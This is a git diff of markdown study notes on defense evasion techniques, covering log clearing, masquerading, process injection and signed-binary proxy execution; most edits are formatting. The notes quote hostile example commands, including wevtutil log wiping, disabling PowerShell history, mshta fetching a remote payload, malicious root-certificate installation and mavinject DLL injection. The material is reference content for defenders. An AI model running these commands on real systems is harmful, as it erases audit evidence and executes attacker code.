 The **PSReadLine** module tracks commands used in all PowerShell sessions and writes them to a file (`$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` by default). Adversaries may change where these logs are saved using `Set-PSReadLineOption -HistorySavePath {File Path}`
 * This will cause **ConsoleHost_history.txt** to stop receiving logs
 * It is possible to turn off logging to this file using the PowerShell command `Set-PSReadlineOption -HistorySaveStyle SaveNothing`
 
 Adversaries may also leverage a Network Device CLI on network devices to disable historical command logging.
-<br>
 
+<br>
 
 ## Disable or Modify System Firewall
 Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the OS, including via command-line, editing Windows Registry keys, and Windows Control Panel.
 
 Modifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed
-<br>
 
+<br>
 
 ## Indicator Blocking
 An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting or even disabling host-based sensors, such as Event Tracing for Windows (ETW),by tampering settings that control the collection and flow of event telemetry
@@ -737,8 +851,8 @@ ETW interruption can be achieved multiple ways, however most directly by definin
 
 In the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis
 * This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events.
-<br>
 
+<br>
 
 ## Disable or Modify Cloud Firewall
 Adversaries may disable or modify a firewall within a cloud environment to bypass controls that limit access to cloud resources. Cloud firewalls are separate from system firewalls that are described in Disable or Modify System Firewall.
@@ -746,16 +860,16 @@ Adversaries may disable or modify a firewall within a cloud environment to bypas
 Cloud environments typically utilize restrictive security groups and firewall rules that only allow network activity from trusted IP addresses via expected ports and protocols. An adversary may introduce new firewall rules or policies to allow access into a victim cloud environment. For example, an adversary may use a script or utility that creates new ingress rules in existing security groups to allow any TCP/IP connectivity.
 
 Modifying or disabling a cloud firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed.
-<br>
 
+<br>
 
 ## Disable Cloud Logs
 An adversary may disable cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection.
 
 Cloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment. If an adversary has sufficient permissions, they can disable logging to avoid detection of their activities
 * In AWS an adversary may disable CloudWatch/CloudTrail integrations prior to conducting further malicious activity
-<br>
 
+<br>
 
 ## Safe Mode Boot
 Safe mode starts up the Windows OS with a limited set of drivers and services. Third-party security software such as EDR tools may not start after booting Windows in safe mode. There are two versions of safe mode: Safe Mode and Safe Mode with Networking. It is possible to start additional services after a safe mode boot
@@ -765,8 +879,8 @@ Adversaries may abuse safe mode to disable endpoint defenses that may not start 
 
 * Adversaries may also add their malicious applications to the list of minimal services that start in safe mode by modifying relevant Registry values
 * Malicious Component Object Model (COM) objects may also be registered and loaded in safe mode
-<br>
 
+<br>
 
 ## Downgrade Attack
 Adversaries may downgrade or use a version of system features that may be outdated, vulnerable, and/or does not support updated security controls such as logging
@@ -774,13 +888,14 @@ Adversaries may downgrade or use a version of system features that may be outdat
 
 Adversaries may downgrade and use less-secure versions of various features of a system, such as Command and Scripting Interpreters or even network protocols that can be abused to enable Adversary-in-the-Middle
 
+<br>
 <hr>
-
 
 # Indicator Removal on Host
 Adversaries may delete or modify artifacts generated on a host system to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary’s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.
 
 Removal of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.
+
 <br>
 
 ## Clear Windows Event Logs
@@ -793,6 +908,7 @@ The event logs can be cleared with the following utility commands:
 * `wevtutil cl application`
 * `wevtutil cl security`
 **Note:** These logs may also be cleared through other mechanisms, such as the event viewer GUI or PowerShell
+
 <br>
 
 ## Clear Linux or Mac System Logs
@@ -806,6 +922,7 @@ macOS and Linux both keep track of system or user-initiated actions via system l
 * `/var/log/cron.log`: Crond logs
 * `/var/log/maillog`: Mail server logs
 * `/var/log/httpd/`: Web server access and error logs
+
 <br>
 
 ## Clear Command History
@@ -832,6 +949,7 @@ PowerShell has two different command history providers: the built-in history and
 Adversaries may run the PowerShell command `Clear-History` to flush the entire command history from a current PowerShell session
 * **Note:** This will not delete/flush the `ConsoleHost_history.txt` file
   * Adversaries may also delete the `ConsoleHost_history.txt` file or edit its contents to hide PowerShell commands they have run
+
 <br>
 
 ## File Deletion
@@ -840,12 +958,14 @@ Malware, tools, or other non-native files dropped or created on a system by an a
 
 There are tools available from the host OS to perform cleanup, but adversaries may use other tools as well
 * Examples of built-in Command and Scripting Interpreter functions include `del` on Windows and `rm` or `unlink` on UNIX
+
 <br>
 
 ## Network Share Connection Removal
 Windows shared drive and SMB/Windows Admin Shares connections can be removed when no longer needed
 * `net use \system\share /delete`: Remove network share connections
 * Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation
+
 <br>
 
 ## Timestomp
@@ -853,10 +973,9 @@ Windows shared drive and SMB/Windows Admin Shares connections can be removed whe
 * This can be done on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools
 * Adversaries may modify file time attributes to hide new or changes to existing files
 * Timestomping may be used along with file name Masquerading to hide malware and tools
+
 <br>
-
 <hr>
-
 
 # Indirect Command Execution
 Various Windows utilities may be used to execute commands, possibly without invoking cmd
@@ -864,9 +983,9 @@ Various Windows utilities may be used to execute commands, possibly without invo
 Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters
 
 Adversaries may abuse these features for Defense Evasion, specifically to perform arbitrary execution while subverting detections and/or mitigation controls (such as Group Policy) that limit/prevent the usage of cmd or file extensions more commonly associated with malicious payloads
+
 <br>
 <hr>
-
 
 # Masquerading
 **Masquerading** Occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation
@@ -874,8 +993,8 @@ Adversaries may abuse these features for Defense Evasion, specifically to perfor
   
 Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools
 * Renaming abusable system utilities to evade security monitoring is also a form of Masquerading
-<br>
 
+<br>
 
 ## Invalid Code Signature
 **Code Signing:** Provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. Adversaries can copy the metadata and signature information from a signed program, then use it as a template for an unsigned program
@@ -892,12 +1011,14 @@ Adversaries may abuse the right-to-left override (RTLO or RLO) character (`U+202
 * Adversaries may abuse the RTLO character as a means of tricking a user into executing what they think is a benign file type
   * **Note:** This technique is commonly used w/ Spearphishing Attachment/Malicious File since it can trick both end users and defenders if they are not aware of how their tools display and render the RTLO character
 * RTLO can be used in the Windows Registry as well, where regedit.exe displays the reversed characters but the command line tool reg.exe does not by default
+
 <br>
 
 ## Rename System Utilities
 Security monitoring and control mechanisms may be in place for system utilities adversaries are capable of abusing
 * It may be possible to bypass those security mechanisms by renaming the utility prior to utilization
 * An alternative case occurs when a legitimate utility is copied or moved to a different directory and renamed to avoid detections based on system utilities executing from non-standard paths
+
 <br>
 
 ## Masquerade Task or Service
@@ -906,6 +1027,7 @@ Tasks/services executed by the Task Scheduler or systemd will typically be given
   * Many benign tasks and services exist that have commonly associated names
 * Adversaries may give tasks or services names that are similar or identical to those of legitimate ones
   * Tasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.[3][4]
+
 <br>
 
 ## Match Legitimate Name or Location
@@ -914,6 +1036,7 @@ Adversaries may match or approximate the name or location of legitimate files or
 * In containerized environments, this may also be done by creating a resource in a namespace that matches the naming convention of a container pod or cluster
 * Alternatively, a file or container image name given may be a close approximation to legitimate programs/images or something innocuous
 * Adversaries may also use the same icon of the file they are trying to mimic
+
 <br>
 
 ## Space after Filename
@@ -922,6 +1045,7 @@ With certain file types (specifically this does not work with .app extensions), 
 * If thefile is renamed to `evil.txt`, it will launch with the default text editing application (not executing the binary)
   * **Note:** If the file is renamed to `evil.txt `(Space at the end), then the true file type is determined by the OS and handled appropriately and the binary will be executed
       * Adversaries can use this feature to trick users into clicking benign-looking files of any format and ultimately executing something malicious
+
 <br>
 
 ## Double File Extension
@@ -938,13 +1062,9 @@ Adversaries may abuse double extensions to attempt to conceal dangerous file typ
 
 Common file types, such as text files (`.txt, .doc, etc.`) and image files (`.jpg, .gif, etc.`) are typically used as the first extension to appear benign
 * Executable extensions commonly regarded as dangerous, such as `.exe, .lnk, .hta, and .scr`, often appear as the second extension and true file type
+
 <br>
-
-
-
-
 <hr>
-
 
 # Modify Authentication Process
 The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials
@@ -953,6 +1073,7 @@ The authentication process is handled by mechanisms, such as the Local Security 
 Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts
 * Maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms
 * Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services
+
 <br>
 
 ## Domain Controller Authentication
@@ -962,6 +1083,7 @@ Malware may be used to inject false credentials into the authentication process 
 * **Skeleton Key** works through a patch on an enterprise domain controller authentication process (LSASS) with credentials that adversaries may use to bypass the standard authentication system
   * Once patched, an adversary can use the injected password to successfully authenticate as any domain user account (until the the skeleton key is erased from memory by a reboot of the domain controller)
   * Authenticated access may enable unfettered access to hosts and/or resources within single-factor authentication environments
+
 <br>
 
 ## Password Filter DLL
@@ -974,6 +1096,7 @@ Malware may be used to inject false credentials into the authentication process 
 Adversaries can register malicious password filters to harvest credentials from local computers and/or entire domains
 * To perform proper validation, filters must receive plain-text credentials from the LSA
 * A malicious password filter would receive these plain-text credentials every time a password request is made
+
 <br>
 
 ## Pluggable Authentication Modules
@@ -985,6 +1108,7 @@ Adversaries may modify components of the PAM system to create backdoors
 
 Malicious modifications to the PAM system may also be abused to steal credentials
 * Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords
+
 <br>
 
 ## Network Device Authentication
@@ -995,6 +1119,7 @@ Adversaries may use *Patch System Image* to hard code a password in the OS, thus
 * Upon authentication attempts, the inserted code will first check to see if the user input is the password
 * If so, access is granted
   * Otherwise, the implanted code will pass the credentials on for verification of potentially valid credentials
+
 <br>
 
 ## Reversible Encryption
@@ -1016,13 +1141,15 @@ With this information, an adversary may be able to reproduce the encryption key 
 An adversary may set this property at various scopes through Local Group Policy Editor, user properties, Fine-Grained Password Policy (FGPP), or via the ActiveDirectory PowerShell module
 * An adversary may implement and apply a FGPP to users or groups if the Domain Functional Level is set to "Windows Server 2008" or higher
 * In PowerShell, an adversary may make associated changes to user settings using commands similar to `Set-ADUser -AllowReversiblePasswordEncryption $true`
-<hr>
 
+<br>
+<hr>
 
 # Modify Cloud Compute Infrastructure
 An adversary may attempt to modify a cloud account's compute service infrastructure to evade defenses. A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots.
 
 Permissions gained from the modification of infrastructure components may bypass restrictions that prevent access to existing infrastructure. Modifying infrastructure components may also allow an adversary to evade detection and remove evidence of their presence
+
 <br>
 
 ## Create Snapshot
@@ -1031,6 +1158,7 @@ Permissions gained from the modification of infrastructure components may bypass
 
 * An adversary may create a snapshot or data backup within a cloud account to evade defenses
 * An adversary may Create Cloud Instance, mount one or more created snapshots to that instance, and then apply a policy that allows the adversary access to the created instance, such as a firewall policy that allows them inbound and outbound SSH access
+
 <br>
 
 ## Create Cloud Instance
@@ -1038,20 +1166,23 @@ An adversary may create a new instance or virtual machine (VM) within the comput
 * Creating a new instance may allow an adversary to bypass firewall rules and permissions that exist on instances currently residing within an account
 * An adversary may Create Snapshot of one or more volumes in an account, create a new instance, mount the snapshots, and then apply a less restrictive security policy to collect Data from Local System or for Remote Data Staging
 * Creating a new instance may also allow an adversary to carry out malicious activity within an environment without affecting the execution of current running instances
+
 <br>
 
 ## Delete Cloud Instance
 An adversary may delete a cloud instance after they have performed malicious activities in an attempt to evade detection and remove evidence of their presence. Deleting an instance or virtual machine can remove valuable forensic artifacts and other evidence of suspicious behavior if the instance is not recoverable.
 
 An adversary may also Create Cloud Instance and later terminate the instance after achieving their objectives
+
 <br>
 
 ## Revert Cloud Instance
 An adversary may revert changes made to a cloud instance after they have performed malicious activities in attempt to evade detection and remove evidence of their presence. In highly virtualized environments, such as cloud-based infrastructure, this may be accomplished by restoring VM or data storage snapshots through the cloud management dashboard or cloud APIs
 
 Another variation of this technique is to utilize temporary storage attached to the compute instance. Most cloud providers provide various types of storage including persistent, local, and/or ephemeral, with the ephemeral types often reset upon stop/restart of the VM
-<hr>
 
+<br>
+<hr>
 
 # Modify Registry
 Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.
@@ -1065,15 +1196,16 @@ Access to specific areas of the Registry depends on account permissions, some re
 * The Registry of a remote system may be modified to aid in execution of files as part of lateral movement
   * It requires the remote Registry service to be running on the target system
   * Often Valid Accounts are required, along with access to the remote system's SMB/Windows Admin Shares for RPC communication
+
 <br>
 <hr>
-
 
 # Modify System Image
 Adversaries may make changes to the OS of embedded network devices to weaken defenses and provide new capabilities for themselves. On such devices, the OSs are typically monolithic and most of the device functionality and capabilities are contained within a single file.
 
 To change the OS, the adversary typically only needs to affect this one file, replacing or modifying it
 * This can either be done live in memory during system runtime for immediate effect, or in storage to implement the change on the next boot of the network device
+
 <br>
 
 ## Patch System Image
@@ -1104,6 +1236,7 @@ When the OS is patched in storage, this can be achieved in either the resident s
 
 When the technique is performed on the running OS in memory and not on the stored copy, this technique will not survive across reboots
 * However, live memory modification of the OS can be combined with `ROMMONkit` to achieve persistence
+
 <br>
 
 ## Downgrade System Image
@@ -1115,10 +1248,9 @@ On embedded devices, downgrading the version typically only requires replacing t
 
 Downgrading the system image to an older versions may allow an adversary to evade defenses by enabling behaviors such as *Weaken Encryption*
 * Downgrading of a system image can be done on its own, or it can be used in conjunction with *Patch System Image*
+
 <br>
-
 <hr>
-
 
 # Network Boundary Bridging
 Adversaries may bridge network boundaries by compromising perimeter network devices or internal devices responsible for network segmentation. Breaching these devices may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.
@@ -1130,6 +1262,7 @@ When an adversary takes control of such a boundary device, they can bypass its p
 * By achieving sufficient rights on the device, an adversary can reconfigure the device to allow the traffic they want, allowing them to then further achieve goals such as C2 via Multi-hop Proxy or exfiltration of data via Traffic Duplication
 * Adversaries may also target internal devices responsible for network segmentation and abuse these in conjunction with Internal Proxy to achieve the same goals
   * In the cases where a border device separates two separate organizations, the adversary can also facilitate lateral movement into new victim environments
+
 <br>
 
 ## Network Address Translation Traversal
@@ -1141,8 +1274,8 @@ When an adversary gains control of a network boundary device, they can either le
 * In the case of network designs that do not require NAT, address translation can be used by adversaries to obscure their activities, as changing the addresses of packets that traverse a network boundary device can make monitoring data transmissions more challenging for defenders
 
 Adversaries may use *Patch System Image* to change the OS of a network device, implementing their own custom NAT mechanisms to further obscure their activities
-<br>
 
+<br>
 <hr>
 
 # Obfuscated Files or Information
@@ -1159,6 +1292,7 @@ Portions of files can also be encoded to hide the plain-text strings that would 
 
 Adversaries may also obfuscate commands executed from payloads or directly via a Command and Scripting Interpreter
 * Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms
+
 <br>
 
 ## Binary Padding
@@ -1171,6 +1305,7 @@ Adversaries may use binary padding to add junk data and change the on-disk repre
 Increasing the file size may decrease the effectiveness of certain tools and detection capabilities that are not designed or configured to scan large files
 * This may also reduce the likelihood of being collected for analysis
 * Public file scanning services, such as VirusTotal, limits the maximum size of an uploaded file to be analyzed
+
 <br>
 
 ## Software Packing
@@ -1183,6 +1318,7 @@ Adversaries may perform software packing or virtual machine software protection 
 * **Packers:** Utilities used to perform software packing
   * Example packers are MPRESS and UPX
   * A more comprehensive list of known packers is available, but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses
+
 <br>
 
 ## Steganography
@@ -1192,6 +1328,7 @@ Steganographic techniques can be used to hide data in digital media such as imag
 
 By the end of 2017, a threat group used `Invoke-PSImage` to hide PowerShell commands in an image file (.png) and execute the code on a victim's system
 * In this particular case the PowerShell code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary
+
 <br>
 
 ## Compile After Delivery
@@ -1201,6 +1338,7 @@ Text-based source code files may subvert analysis and scrutiny from protections 
 
 Source code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as a Phish
 * Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework 
+
 <br>
 
 ## Indicator Removal from Tools
@@ -1208,6 +1346,7 @@ Adversaries may remove indicators from tools if they believe their malicious too
 
 A good example of this is when malware is detected with a file signature and quarantined by anti-virus software
 * An adversary who can determine that the malware was quarantined because of its file signature may modify the file to explicitly avoid that signature, and then re-use the malware
+
 <br>
 
 ## HTML Smuggling
@@ -1222,8 +1361,8 @@ Security controls such as web content filters may not identify smuggled maliciou
 * Malicious files or data can be obfuscated and hidden inside of HTML files through Data URLs and/or JavaScript Blobs and can be deobfuscated when they reach the victim (i.e. Deobfuscate/Decode Files or Information), potentially bypassing content filters
 
 JavaScript Blobs can be abused to dynamically generate malicious files in the victim machine and may be dropped to disk by abusing JavaScript functions such as *msSaveBlob*
-<hr>
 
+<hr>
 
 # Plist File Modification
 macOS applications use property list files, such as `info.plist` file, to store properties and configuration settings that inform the OS how to handle the application at runtime
@@ -1238,12 +1377,14 @@ Attackers can add a malicious application path to the `~/Library/Preferences/com
 * Adversaries can also modify the `LSUIElement` key in an application’s `info.plist` file to run the app in the background
 * Adversaries can also insert key-value pairs to insert environment variables, such as `LSEnvironment`, to enable persistence via Dynamic Linker Hijacking 
 
+<br>
 <hr>
 
 # Pre-OS Boot
 Adversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system. During the booting process of a computer, firmware and various startup services are loaded before the OS. These programs control flow of execution before the OS takes control 
 
 Adversaries may overwrite data in boot drivers or firmware such as BIOS / UEFI to persist on systems at a layer below the OS. This can be particularly difficult to detect as malware at this level will not be detected by host software-based defenses
+
 <br>
 
 ## System Firmware
@@ -1277,6 +1418,7 @@ An adversary who has raw access to the boot drive may overwrite this area, diver
 * This provides adversaries with the means to update the ROMMON to gain persistence on a system in a way that may be difficult to detect
 
 Adversaries may abuse the ROM Monitor (ROMMON) by loading an unauthorized firmware with adversary code to provide persistent access and manipulate device behavior that is difficult to detect 
+
 <br>
 
 ## TFTP Boot
@@ -1288,6 +1430,8 @@ Adversaries may abuse the ROM Monitor (ROMMON) by loading an unauthorized firmwa
 Adversaries may manipulate the configuration on the network device specifying use of a malicious TFTP server, which may be used in conjunction with *Modify System Image* to load a modified image on device startup or reset
 * The unauthorized image allows adversaries to modify device configuration, add malicious capabilities to the device, and introduce backdoors to maintain control of the network device while minimizing detection through use of a standard functionality
 * This technique is similar to ROMMONkit and may result in the network device running a modified image
+
+<br>
 <hr>
 
 # Process Injection
@@ -1306,6 +1450,7 @@ More sophisticated samples may perform multiple process injections to segment mo
 * The write can be performed with native Windows API calls such as `VirtualAllocEx` and `WriteProcessMemory`, then invoked with `CreateRemoteThread` (which calls the `LoadLibrary` API responsible for loading the DLL)
 
 Variations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of LoadLibrary)
+
 <br>
 
 ## Portable Executable Injection
@@ -1357,7 +1502,6 @@ TLS callback injection involves manipulating pointers inside a PE to redirect a 
 Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via TLS callback injection may also evade detection from security products since the execution is masked under a legitimate process
 
 <br>
-
 
 ## Ptrace System Calls
 Adversaries may inject malicious code into processes via ptrace (process trace) system calls in order to evade process-based defenses as well as possibly elevate privileges. Ptrace system call injection is a method of executing arbitrary code in the address space of a separate live process.
@@ -1465,6 +1609,7 @@ Some variations of ListPlanting may allocate memory in the target process but th
 * An adversary can use the `PostMessage` and/or `SendMessage` API functions to send `LVM_SETITEMPOSITION and LVM_GETITEMPOSITION` messages, effectively copying a payload 2 bytes at a time to the allocated memory
 
 Finally, the payload is triggered by sending the `LVM_SORTITEMS` message to the *SysListView32* child of the process window, with the payload within the newly allocated buffer passed and executed as the `ListView_SortItems` callback
+
 <br>
 
 # Reflective Code Loading
@@ -1474,8 +1619,8 @@ Finally, the payload is triggered by sending the `LVM_SORTITEMS` message to the 
 **NOTE::** Reflective Code Injection is very similar to Process Injection except that the "injection" loads code into the processes’ own memory instead of that of a separate process
 * Reflective loading may evade process-based detections since the execution of the arbitrary code may be masked within a legitimate or otherwise benign process
 * Reflectively loading payloads directly into memory may also avoid creating files or other artifacts on disk, while also enabling malware to keep these payloads encrypted (or otherwise obfuscated) until execution
-<br>
 
+<br>
 <hr>
 
 # Rogue Domain Controller
@@ -1484,21 +1629,21 @@ Finally, the payload is triggered by sending the `LVM_SORTITEMS` message to the 
   * Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys
 
 
-**Registering a rogue DC** 
+### Registering a rogue DC
 * Create a new server and `nTDSDSA` objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the `KRBTGT` hash
 
 * This technique may bypass system logging and security monitors since actions taken on a rogue DC may not be reported to these sensors
 * The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis
 * Adversaries may also utilize this technique to perform `SID-History Injection` and/or manipulate AD objects to establish backdoors for Persistence 
-<br>
 
+<br>
 <hr>
 
 # Rootkit
 **Rootkits:** Programs that hide the existence of malware by intercepting/hooking and modifying OS API calls that supply system information
 * Rootkits or rootkit enabling functionality may reside at the user or kernel level in the OS or lower, to include a hypervisor, Master Boot Record, or System Firmware
-<br>
 
+<br>
 <hr>
 
 # Subvert Trust Controls
@@ -1525,6 +1670,7 @@ The quarantine flag is an opt-in system and not imposed by macOS. If an applicat
 
 Apps and files loaded onto the system from a USB flash drive, optical disk, external hard drive, from a drive shared over the local network, or using the `curl` command do not set this flag
 * Additionally, it is possible to avoid setting this flag using Drive-by Compromise, which may bypass Gatekeeper
+
 <br>
 
 ## Code Signing
@@ -1535,6 +1681,7 @@ Apps and files loaded onto the system from a USB flash drive, optical disk, exte
 Code signing to verify software on first run can be used on modern Windows and macOS/OS X systems -- It is not used on Linux due to the decentralized nature of the platform
 
 Code signing certificates may be used to bypass security policies that require signed code to execute on a system.
+
 <br>
 
 ## SIP and Trust Provider Hijacking
@@ -1566,6 +1713,7 @@ Note: The above hijacks are also possible without modifying the Registry via DLL
 
 
 Hijacking SIP or trust provider components can also enable persistent code execution, since these malicious components may be invoked by any application that performs code signing or signature validation 
+
 <br>
 
 ## Install Root Certificate
@@ -1580,13 +1728,17 @@ A typical root certificates have also been pre-installed on systems by the manuf
 Root certificates and their associated chains can also be cloned and reinstalled
 * Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence
 
-**In macOS**, the Ay MaMi malware uses `/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert` to install a malicious certificate as a trusted root certificate into the system keychain
+### In macOS
+Ay MaMi malware uses `/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert` to install a malicious certificate as a trusted root certificate into the system keychain
+
 <br>
 
 ## Mark-of-the-Web Bypass
 Attackers may abuse specific file formats to subvert Mark-of-the-Web (MOTW) controls
 
-**In Windows**, when files are downloaded from the Internet, they are tagged with a hidden NTFS Alternate Data Stream (ADS) named `Zone.Identifier` with a specific value known as the MOTW
+
+### In Windows
+When files are downloaded from the Internet, they are tagged with a hidden NTFS Alternate Data Stream (ADS) named `Zone.Identifier` with a specific value known as the MOTW
 * Files that are tagged with MOTW are protected and cannot perform certain actions
   * Starting in MS Office 10, if a MS Office file has the MOTW, it will open in Protected View
   * Executables tagged with the MOTW will be processed by Windows Defender SmartScreen that compares files with an allowlist of well-known executables
@@ -1595,6 +1747,7 @@ Attackers may abuse specific file formats to subvert Mark-of-the-Web (MOTW) cont
 Adversaries may abuse container files such as compressed/archive (.arj, .gzip) and/or disk image (.iso, .vhd) file formats to deliver malicious payloads that may not be tagged with MOTW
 * Container files downloaded from the Internet will be marked with MOTW but the files within may not inherit the MOTW after the container files are extracted and/or mounted
 * **MOTW** A NTFS feature and many container files do not support NTFS alternative data streams. After a container file is extracted and/or mounted, the files contained within them may be treated as local files on disk and run without protections
+
 <br>
 
 ## Code Signing Policy Modification
@@ -1614,6 +1767,7 @@ Depending on the implementation, successful modification of a signing policy may
 
 To gain access to kernel memory to modify variables related to signature checks, such as modifying g_CiOptions to disable Driver Signature Enforcement, adversaries may conduct Exploitation for Privilege Escalation using a signed, but vulnerable driver
 
+<br>
 <hr>
 
 # System Binary Proxy Execution
@@ -1622,6 +1776,7 @@ Adversaries may bypass process and/or signature-based defenses by proxying execu
 Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files or commands.
 
 Similarly, on Linux systems adversaries may abuse trusted binaries such as split to proxy execution of malicious commands. 
+
 <br>
 
 ## Compiled HTML File
@@ -1633,6 +1788,7 @@ CHM content is displayed using underlying components of the Internet Explorer br
 
 A custom CHM file containing embedded payloads could be delivered to a victim then triggered by User Execution
 * CHM execution may also bypass application application control on older and/or unpatched systems that do not account for execution of binaries through hh.exe
+
 <br>
 
 ## Control Panel
@@ -1648,6 +1804,7 @@ Malicious Control Panel items can be delivered via Phishing campaigns or execute
 Adversaries may also rename malicious DLL files (.dll) with Control Panel file extensions (.cpl) and register them to `HKCU\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls`
 * Even when these registered DLLs do not comply with the CPL file specification and do not export *CPlApplet* functions, they are loaded and executed through its `DllEntryPoint` when Control Panel is executed
 * CPL files not exporting CPlApplet are not directly executable
+
 <br>
 
 ## CMSTP
@@ -1683,6 +1840,7 @@ Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and J
 * Executed files directly from URLs: `mshta http[:]//webserver/payload[.]hta`
 
 **Mshta.exe** can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings
+
 <br>
 
 ## Msiexec
@@ -1694,6 +1852,7 @@ Adversaries may abuse msiexec.exe to proxy execution of malicious payloads
 * Msiexec.exe can also execute DLLs
   * Since it may be signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse
 * Msiexec.exe execution may also be elevated to SYSTEM privileges if the `AlwaysInstallElevated` policy is enabled
+
 <br>
 
 ## Odbcconf
@@ -1702,6 +1861,7 @@ Adversaries may abuse msiexec.exe to proxy execution of malicious payloads
 Adversaries may abuse odbcconf.exe to proxy execution of malicious payloads
 * Adversaries may abuse odbcconf.exe to bypass application control solutions that do not account for its potential abuse
 * Similar to Regsvr32, odbcconf.exe has a REGSVR flag that can be misused to execute DLLs (ex: `odbcconf.exe /S /A {REGSVR "C:\Users\Public\file.dll"})`
+
 <br>
 
 ## Regsvcs/Regasm
@@ -1713,6 +1873,7 @@ Adversaries may abuse Regsvcs and Regasm to proxy execution of code through a tr
 
 Both utilities may be used to bypass application control through use of attributes within the binary to specify code that should be run before registration or unregistration: `ComRegisterFunction` or `ComUnregisterFunction` respectively
 * The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute
+
 <br>
 
 ## Regsvr32
@@ -1724,6 +1885,7 @@ Malicious usage of Regsvr32.exe may avoid triggering security tools that may not
   * This method makes no changes to the Registry as the COM object is not actually registered, only executed
   * This variation of the technique is often referred to as a *Squiblydoo* and has been used in campaigns targeting governments
 * Regsvr32.exe can also be leveraged to register a COM Object used to establish persistence via Component Object Model Hijacking
+
 <br>
 
 ## Rundll32
@@ -1741,6 +1903,7 @@ Adversaries may also attempt to obscure malicious code from analysis by abusing 
 * DLL functions can also be exported and executed by an ordinal number (ex: `rundll32.exe file.dll,#1`)
 
 Additionally, adversaries may use Masquerading techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload
+
 <br>
 
 ## Verclsid
@@ -1750,6 +1913,7 @@ Adversaries may abuse verclsid.exe to execute malicious payloads
 * This may be achieved by running `verclsid.exe /S /C {CLSID}`, where the file is referenced by a Class ID (CLSID), a unique identification number used to identify COM objects
 * COM payloads executed by verclsid.exe may be able to perform various malicious actions, such as loading and executing COM scriptlets (SCT) from remote servers (similar to Regsvr32)
 * Since the binary may be signed and/or native on Windows systems, proxying execution via verclsid.exe may bypass application control solutions that do not account for its potential abuse
+
 <br>
 
 ## Mavinject
@@ -1758,6 +1922,7 @@ Adversaries may abuse verclsid.exe to execute malicious payloads
 Adversaries may abuse mavinject.exe to inject malicious DLLs into running processes (i.e. Dynamic-link Library Injection), allowing for arbitrary code execution (ex. `C:\Windows\system32\mavinject.exe PID /INJECTRUNNING PATH_DLL`)
